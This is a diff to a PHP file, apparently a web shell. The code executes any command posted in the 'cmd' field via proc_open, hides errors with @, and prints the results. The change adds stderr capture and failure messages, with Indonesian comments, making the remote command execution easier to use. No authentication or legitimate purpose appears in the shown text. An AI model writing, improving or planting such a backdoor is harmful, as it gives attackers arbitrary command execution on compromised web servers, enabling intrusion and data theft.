@@ -457,10 +457,17 @@ if (isset($_POST['cmd'])) {
         $process = @proc_open($cmd, $descriptorspec, $pipes);
         if (is_resource($process)) {
             $output = @stream_get_contents($pipes[1]);
+            $stderr = @stream_get_contents($pipes[2]);  // Menangkap stderr
             @fclose($pipes[0]);
             @fclose($pipes[1]);
             @fclose($pipes[2]);
             $resultCode = @proc_close($process);
+
+            // Menampilkan stderr jika ada
+            if (!empty($stderr)) {
+                echo "<pre>Error: " . htmlspecialchars($stderr, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
+            }
+
             if (!empty($output)) {
                 echo "<pre>Result Code: $resultCode</pre>";
                 echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
@@ -476,6 +483,8 @@ if (isset($_POST['cmd'])) {
             echo "<pre>Result Code: $resultCode</pre>";
             echo "<pre>" . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
             echo "</div>";
+        } else {
+            echo "<pre>No output or command failed.</pre>";
         }
     }
     else {
